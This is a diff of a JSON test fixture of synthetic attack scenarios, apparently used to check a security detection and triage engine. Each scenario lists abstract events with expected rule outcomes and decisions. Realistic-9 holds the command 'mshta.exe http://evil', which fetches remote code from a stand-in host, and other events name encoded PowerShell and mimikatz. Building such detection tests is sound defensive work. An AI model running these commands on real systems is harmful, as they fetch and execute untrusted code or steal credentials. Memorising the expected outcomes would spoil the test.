@@ -1,44 +1,130 @@
 {
   "scenarios": [
     {
-      "id": "phishing-to-c2",
-      "description": "User opens attachment, macro runs, C2 beacons",
+      "id": "realistic-1",
+      "description": "Identity anomaly with impossible travel and new device",
       "events": [
-        {"id": "e1", "time": "2026-02-05T01:00:00Z", "host": "host-1", "user": "alice", "type": "email_attachment_open", "details": {}},
-        {"id": "e2", "time": "2026-02-05T01:01:00Z", "host": "host-1", "user": "alice", "type": "macro_execution", "details": {}},
-        {"id": "e3", "time": "2026-02-05T01:02:00Z", "host": "host-1", "user": "alice", "type": "beacon_outbound", "details": {"dst": "c2"}}
-      ],
-      "labels": [{"rule_id": "TA0001.PHISHING", "outcome": "feasible"}]
-    },
-    {
-      "id": "privesc-to-creddump",
-      "description": "Privilege escalation then credential dumping",
-      "events": [
-        {"id": "e4", "time": "2026-02-05T02:00:00Z", "host": "host-2", "user": "bob", "type": "token_manipulation", "details": {}},
-        {"id": "e5", "time": "2026-02-05T02:01:00Z", "host": "host-2", "user": "bob", "type": "admin_group_change", "details": {}},
-        {"id": "e5b", "time": "2026-02-05T02:01:30Z", "host": "host-2", "user": "bob", "type": "process_creation", "details": {"process": "mimikatz"}},
-        {"id": "e6", "time": "2026-02-05T02:02:00Z", "host": "host-2", "user": "bob", "type": "lsass_access", "details": {}}
+        {"id": "s1-1", "time": "2026-02-06T10:00:00Z", "host": "", "user": "alice", "type": "impossible_travel", "details": {}},
+        {"id": "s1-2", "time": "2026-02-06T10:01:00Z", "host": "", "user": "alice", "type": "new_device_login", "details": {}}
       ],
       "labels": [
-        {"rule_id": "TA0004.PRIVESCA", "outcome": "feasible"},
-        {"rule_id": "TA0006.CREDDUMP", "outcome": "feasible"}
+        {"rule_id": "TA0006.IDENTITY_ANOMALY", "outcome": "feasible"}
       ]
     },
     {
-      "id": "lateral-incomplete",
-      "description": "Network logon without remote service creation",
+      "id": "realistic-2",
+      "description": "LOLBin chain missing execution evidence",
       "events": [
-        {"id": "e7", "time": "2026-02-05T03:00:00Z", "host": "host-3", "user": "carol", "type": "network_logon", "details": {"src": "host-1"}}
+        {"id": "s2-1", "time": "2026-02-06T11:00:00Z", "host": "web-01", "user": "bob", "type": "process_creation", "details": {"command_line": "powershell.exe -enc"}}
       ],
-      "labels": [{"rule_id": "TA0008.LATERAL", "outcome": "incomplete"}]
+      "labels": [
+        {"rule_id": "TA0002.LOLBIN_CHAIN", "outcome": "incomplete"}
+      ]
     },
     {
-      "id": "exfil-impossible",
-      "description": "Large outbound transfer without staging or C2",
+      "id": "realistic-3",
+      "description": "Exfiltration attempt with missing transfer",
       "events": [
-        {"id": "e8", "time": "2026-02-05T04:00:00Z", "host": "host-4", "user": "dave", "type": "large_outbound_transfer", "details": {"bytes": 10000000}}
+        {"id": "s3-1", "time": "2026-02-06T11:30:00Z", "host": "db-01", "user": "carl", "type": "data_staging", "details": {}},
+        {"id": "s3-2", "time": "2026-02-06T11:31:00Z", "host": "db-01", "user": "carl", "type": "beacon_outbound", "details": {}},
+        {"id": "s3-3", "time": "2026-02-06T11:32:00Z", "host": "db-01", "user": "carl", "type": "lsass_access", "details": {}}
       ],
-      "labels": [{"rule_id": "TA0010.EXFIL", "outcome": "incomplete"}]
+      "labels": [
+        {"rule_id": "TA0010.EXFIL", "outcome": "incomplete"}
+      ]
+    },
+    {
+      "id": "realistic-4",
+      "description": "Credential dumping without privilege escalation",
+      "events": [
+        {"id": "s4-1", "time": "2026-02-06T11:45:00Z", "host": "win-04", "user": "dana", "type": "process_creation", "details": {"tool": "procdump"}},
+        {"id": "s4-2", "time": "2026-02-06T11:45:30Z", "host": "win-04", "user": "dana", "type": "lsass_access", "details": {}}
+      ],
+      "labels": [
+        {"rule_id": "TA0006.CREDDUMP", "outcome": "impossible"}
+      ]
+    },
+    {
+      "id": "realistic-5",
+      "description": "Logging tamper after initial access",
+      "events": [
+        {"id": "s5-1", "time": "2026-02-06T12:00:00Z", "host": "srv-01", "user": "eve", "type": "email_attachment_open", "details": {}},
+        {"id": "s5-2", "time": "2026-02-06T12:00:10Z", "host": "srv-01", "user": "eve", "type": "macro_execution", "details": {}},
+        {"id": "s5-3", "time": "2026-02-06T12:01:00Z", "host": "srv-01", "user": "eve", "type": "disable_logging", "details": {}},
+        {"id": "s5-4", "time": "2026-02-06T12:01:10Z", "host": "srv-01", "user": "eve", "type": "policy_bypass", "details": {}}
+      ],
+      "labels": [
+        {"rule_id": "TA0005.LOG_TAMPER", "outcome": "feasible"}
+      ]
+    },
+    {
+      "id": "realistic-6",
+      "description": "Admin protocol lateral movement with credential access",
+      "events": [
+        {"id": "s6-1", "time": "2026-02-06T12:10:00Z", "host": "app-01", "user": "fred", "type": "lsass_access", "details": {}},
+        {"id": "s6-2", "time": "2026-02-06T12:10:30Z", "host": "app-01", "user": "fred", "type": "new_inbound_admin_protocol", "details": {"protocol": "rdp"}},
+        {"id": "s6-3", "time": "2026-02-06T12:10:40Z", "host": "app-01", "user": "fred", "type": "network_logon", "details": {}}
+      ],
+      "labels": [
+        {"rule_id": "TA0008.ADMIN_PROTOCOL_LATERAL", "outcome": "feasible"}
+      ]
+    },
+    {
+      "id": "realistic-7",
+      "description": "Identity anomaly escalation with clear host/principal",
+      "events": [
+        {"id": "s7-1", "time": "2026-02-06T13:00:00Z", "host": "idp-01", "user": "sam", "type": "impossible_travel", "details": {}},
+        {"id": "s7-2", "time": "2026-02-06T13:01:00Z", "host": "idp-01", "user": "sam", "type": "new_device_login", "details": {}}
+      ],
+      "labels": [
+        {"rule_id": "TA0006.IDENTITY_ANOMALY", "outcome": "feasible"}
+      ],
+      "expectations": [
+        {"rule_id": "TA0006.IDENTITY_ANOMALY", "decision_label": "escalate", "ticket_status": "in_review"}
+      ]
+    },
+    {
+      "id": "realistic-8",
+      "description": "Exfil chain with missing transfer evidence",
+      "events": [
+        {"id": "s8-1", "time": "2026-02-06T13:10:00Z", "host": "db-02", "user": "tina", "type": "data_staging", "details": {}},
+        {"id": "s8-2", "time": "2026-02-06T13:10:10Z", "host": "db-02", "user": "tina", "type": "beacon_outbound", "details": {}},
+        {"id": "s8-3", "time": "2026-02-06T13:10:20Z", "host": "db-02", "user": "tina", "type": "lsass_access", "details": {}}
+      ],
+      "labels": [
+        {"rule_id": "TA0010.EXFIL", "outcome": "incomplete"}
+      ],
+      "expectations": [
+        {"rule_id": "TA0010.EXFIL", "decision_label": "deprioritize", "ticket_status": "open"}
+      ]
+    },
+    {
+      "id": "realistic-9",
+      "description": "LOLBin chain with preconditions missing",
+      "events": [
+        {"id": "s9-1", "time": "2026-02-06T13:20:00Z", "host": "web-02", "user": "uma", "type": "process_creation", "details": {"command_line": "mshta.exe http://evil"}},
+        {"id": "s9-2", "time": "2026-02-06T13:20:10Z", "host": "web-02", "user": "uma", "type": "lolbin_execution", "details": {}}
+      ],
+      "labels": [
+        {"rule_id": "TA0002.LOLBIN_CHAIN", "outcome": "impossible"}
+      ],
+      "expectations": [
+        {"rule_id": "TA0002.LOLBIN_CHAIN", "decision_label": "keep", "ticket_status": "open", "reason_code": "precond_missing"}
+      ]
+    },
+    {
+      "id": "realistic-10",
+      "description": "Identity anomaly without context",
+      "events": [
+        {"id": "s10-1", "time": "2026-02-06T13:30:00Z", "host": "", "user": "", "type": "impossible_travel", "details": {}},
+        {"id": "s10-2", "time": "2026-02-06T13:30:10Z", "host": "", "user": "", "type": "new_device_login", "details": {}}
+      ],
+      "labels": [
+        {"rule_id": "TA0006.IDENTITY_ANOMALY", "outcome": "feasible"}
+      ],
+      "expectations": [
+        {"rule_id": "TA0006.IDENTITY_ANOMALY", "decision_label": "escalate", "reason_code": "environment_unknown"}
+      ]
     }
   ]
 }
